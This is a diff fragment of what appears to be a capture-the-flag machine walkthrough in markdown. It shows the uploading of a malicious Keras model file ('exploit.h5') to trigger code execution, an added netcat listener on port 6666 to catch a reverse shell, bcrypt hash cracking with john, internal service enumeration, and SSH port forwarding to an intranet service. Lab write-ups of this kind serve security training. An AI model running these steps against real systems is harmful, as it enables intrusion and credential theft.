@@ -59,8 +59,15 @@ model.add(tf.keras.layers.Lambda(exploit))
 model.compile()
 model.save("exploit.h5")
 ```
+Open a nc connection in your terminal as a listenner
 
-3. Upload model and trigger execution by clicking **"View Predictions"**.
+```bash
+nc -nlvp 6666
+```
+## 3. Upload model and trigger execution by clicking **"View Predictions"**.
+
+ 
+
 ---
 ## Getting User
 
@@ -133,7 +140,17 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 
 Cracked Password: `!@#$%^`
 
+## Now check the intranet connections 
+
+```bash
+ss -tulnp
+```
+Here you will find a service running inside the network on port 9898
+
 ### Internal Port Forwarding
+
+Access the internal (intranet-only) web apps or services behind the firewall 
+-L set up local port forwarding on 9898 in the attacker's machine
 
 ```bash
 ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
